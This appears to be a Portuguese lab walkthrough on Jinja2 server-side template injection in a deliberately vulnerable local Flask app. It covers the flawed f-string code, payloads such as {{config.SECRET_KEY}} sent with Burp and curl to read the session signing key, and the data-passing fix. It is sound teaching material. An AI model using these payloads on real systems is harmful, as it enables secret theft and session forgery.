# Walkthrough — ssti-jinja

A app monta uma saudação personalizada: você manda um `name` e ela responde `Hello, <name>!`. Por baixo, ela costura o seu `name` no texto do template que renderiza a resposta. Como o **Jinja2** — o template engine do Flask, o componente que transforma um template em HTML — *compila* o texto que recebe, o seu `name` não é tratado como um valor: é tratado como código de template. Mande `{{7*7}}` e a resposta é `Hello, 49!` — o motor avaliou a expressão. Isto é **Server-Side Template Injection (SSTI)**, e a partir desse mesmo apoio você vai ler a configuração da própria app, incluindo a `SECRET_KEY` que assina as sessões dela.

## 1. Contexto

Em `/` você recebe um form com um único campo `name`. Submeter dispara `GET /greet?name=<name>`; o servidor renderiza `Hello, <name>!` e devolve. Essa é a feature inteira.

Isto é A03 — Injection: input não-confiável chega num motor — aqui o template engine — que o interpreta com poder demais. Não há banco nem segundo serviço, só a app `vulnerable` em `127.0.0.1:8019` e a `fixed` em `127.0.0.1:8119`. A exploração é feita inteiramente no Burp.

## 2. Ache o bug

Abra [`vulnerable/app.py`](./vulnerable/app.py). A view `/greet` monta a resposta assim:

```python
name = request.args.get("name", "world")
# VULNERABLE: the name is concatenated INTO the template source with an f-string
return render_template_string(
    "<!doctype html><title>Greeting</title>"
    "<p><strong>&#9888; Intentionally vulnerable. Run locally only.</strong></p>"
    f"<h1>Hello, {name}!</h1>"                        # name is IN the template source -> SSTI
    '<p><a href="/">&larr; Back</a></p>'
)
```

`render_template_string` renderiza uma **string** como template Jinja2. A f-string cola o `name` dentro dessa string *antes* de o Jinja2 vê-la, então o seu `name` vira parte do source do template — não um valor passado pra ele. O que você mandar é compilado como código de template. Pergunta de auditoria: *o meu `name` é parte do texto que o motor compila — então uma expressão `{{ ... }}` que eu mandar vai ser avaliada?* — sim. O fix (foreshadow): passar o `name` como dado, mantido fora do source.

## 3. Exploração via Burp Suite

Configure o Burp Proxy e aponte seu browser pra ele. Visite <http://127.0.0.1:8019/>, submeta o form uma vez pra capturar o tráfego, depois clique com o botão direito no request `GET /greet?name=Ada` em **Proxy → HTTP history** e escolha **Send to Repeater**.

### Uma nota sobre URL encoding

Os payloads usam `{` e `}`, que não são legais crus numa URL. URL-encode o **valor** de `name` antes de enviar: `{` → `%7B`, `}` → `%7D`. O jeito fácil no Repeater: cole o payload decodado depois de `name=`, selecione, e aperte **Ctrl+U** — o Burp encoda a seleção (também encoda `*`, `[`, `]`, e aspas; tudo inofensivo). Cada passo abaixo mostra o **payload decodado** (pra leitura) e a **request line** pronta pra colar.

O equivalente com curl, que URL-encoda o valor pra você:

```bash
curl -G http://127.0.0.1:8019/greet --data-urlencode 'name=<payload>'
```

### Passo 1 — Baseline: a feature funciona

Payload:

```
Ada
```

Request line no Repeater:

```
GET /greet?name=Ada HTTP/1.1
Host: 127.0.0.1:8019
```

Resposta:

```html
<!doctype html><title>Greeting</title><p><strong>&#9888; Intentionally vulnerable. Run locally only.</strong></p><h1>Hello, Ada!</h1><p><a href="/">&larr; Back</a></p>
```

A saudação funciona como esperado. Daqui em diante, só a linha `<h1>` muda, então os passos abaixo mostram só ela.

### Passo 2 — Confirmar a injeção

Payload:

```
{{7*7}}
```

Request line no Repeater:

```
GET /greet?name=%7B%7B7*7%7D%7D HTTP/1.1
Host: 127.0.0.1:8019
```

Resposta:

```html
<h1>Hello, 49!</h1>
```

O motor avaliou `7*7`. Se o seu input fosse tratado como dado você veria `Hello, {{7*7}}!` literal — em vez disso você recebeu `49`. Essa é a prova de que o seu input virou código de template, não um valor. `{{7*7}}` é o probe clássico de SSTI: uma expressão aritmética inofensiva que só produz `49` se algo estiver avaliando.

### Passo 3 — Ler a config e a SECRET_KEY (clímax)

O Flask coloca um objeto `config` no contexto de **todo** template por default — a app nunca precisa passá-lo. Como o seu input *é* código de template, peça pro motor renderizar `config`:

Payload:

```
{{config}}
```

Request line no Repeater:

```
GET /greet?name=%7B%7Bconfig%7D%7D HTTP/1.1
Host: 127.0.0.1:8019
```

Resposta (abreviada — a config inteira do Flask volta, com a chave de assinatura no meio):

```html
<h1>Hello, &lt;Config {&#39;DEBUG&#39;: False, ... &#39;SECRET_KEY&#39;: &#39;dev-secret-CHANGEME-not-a-real-secret&#39;, ... &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt;!</h1>
```

Os angle brackets e as aspas voltam HTML-escaped (`&lt;`, `&#39;`) — o Jinja2 autoescapa o *output renderizado* — mas o valor é totalmente revelado: um browser mostra `<Config {... 'SECRET_KEY': 'dev-secret-CHANGEME-not-a-real-secret', ...}>`. Escapar os caracteres de exibição não impede o disclosure; o motor leu o objeto e devolveu.

Vá direto na chave — `config` é um dict, então indexe:

Payload:

```
{{config.SECRET_KEY}}
```

(`{{config['SECRET_KEY']}}` é equivalente; a forma de atributo só evita colchetes e aspas na URL.)

Request line no Repeater:

```
GET /greet?name=%7B%7Bconfig.SECRET_KEY%7D%7D HTTP/1.1
Host: 127.0.0.1:8019
```

Resposta:

```html
<h1>Hello, dev-secret-CHANGEME-not-a-real-secret!</h1>
```

Você tem a `SECRET_KEY` da app — a chave que o Flask usa pra assinar cookies de sessão. (O valor aqui é um placeholder de lab obviamente falso, não um segredo real.) A partir desse mesmo apoio de expressão, a classe SSTI pode escalar mais, chegando a execução de comando pela hierarquia de objetos do Python — mas este átomo para em ler a config.

## 4. O que a vuln NÃO é

O exploit é uma expressão que o motor executa, então é fácil tirar a lição errada. Isole a causa real:

- **NÃO é "usar Jinja2 / renderizar templates".** Todo Flask renderiza templates Jinja2. **Prova:** mande `name=Ada` pra app vulnerable **e** pra fixed — as duas retornam exatamente `Hello, Ada!`. A lógica da saudação é idêntica. Só `{{7*7}}` / `{{config}}` separa as duas. A diferença é *onde o input entra*, não "usar template".
- **NÃO é "`render_template_string` é a função perigosa".** A app fixed chama a **mesma** função — com segurança — passando o name como dado (`render_template_string("...{{ name }}...", name=name)`). O bug é *costurar* o input no source com a f-string, não a chamada. Veja o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md).
- **NÃO é (só) XSS.** Costurar o input no source também emite HTML cru — um `name` de `<b>x</b>` renderiza em negrito — que é reflected cross-site scripting (XSS), uma classe diferente coberta pelo `xss-reflected`. A lição *aqui* é a **avaliação**: o motor computa `7*7` e lê `config`, coisa que reflexão de HTML cru não faz.
- **NÃO é remote code execution (neste átomo).** A classe SSTI pode escalar de avaliar uma expressão pra executar comandos via a hierarquia de objetos do Python; este átomo para em ler `config` / a `SECRET_KEY` — um disclosure de segredo direto.

A única coisa que a vuln **é**: o template engine avalia uma expressão que *você* injeta, porque o seu input é parte do source do template, e te entrega o resultado. O único fix é manter o input **fora** do source — passá-lo como dado.

## 5. Impacto

**Disclosure de segredo, escalando pra sessão forjada.** O atacante faz o motor avaliar `{{config}}` e lê a `SECRET_KEY` do Flask — a chave que assina os cookies de sessão. Com essa chave um atacante pode forjar ou adulterar cookies de sessão (impersonar qualquer usuário, ligar um flag `admin`), então o finding é disclosure com um caminho direto pra account takeover via sessão forjada. **Não** é remote code execution por si só neste átomo: SSTI como classe pode alcançar execução de código, mas aqui o payload lê configuração. Sem overclaim.

## 6. Por que o fix funciona

Veja o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra mudança. A `/greet` fixed passa o name como **dado** em vez de costurá-lo no source:

```python
return render_template_string(
    "<!doctype html><title>Greeting</title>"
    "<p><strong>&#9888; Intentionally vulnerable. Run locally only.</strong></p>"
    "<h1>Hello, {{ name }}!</h1>"                     # {{ name }} placeholder filled from data
    '<p><a href="/">&larr; Back</a></p>',
    name=name,                                        # name passed as DATA, never sewn in
)
```

Agora `{{ name }}` é um placeholder escrito pelo desenvolvedor, e `name=name` o preenche com o valor. O Jinja2 escapa esse valor e nunca o re-avalia. Repita os Passos 2 e 3 contra <http://127.0.0.1:8119/greet>:

```html
<h1>Hello, {{7*7}}!</h1>
```

```html
<h1>Hello, {{config}}!</h1>
```

Os dois voltam **literais** — o motor não avaliou —, e a `SECRET_KEY` nunca vaza. O `name=Ada` benigno ainda saúda como `Hello, Ada!`, então a feature está intacta; só a avaliação sumiu. O fix inteiro é passar o name como dado em vez de emendá-lo no source do template. Note que o fix é *estrutural* — manter o input fora do template — não um blocklist de `{{`/`}}`, que seria um filtro pra burlar. Nem uma sandbox é a resposta: o Jinja2 traz um `SandboxedEnvironment` que tenta *conter* o que uma expressão pode fazer, mas é uma defesa mais fraca e historicamente furada — o fix real é não injetar de início.
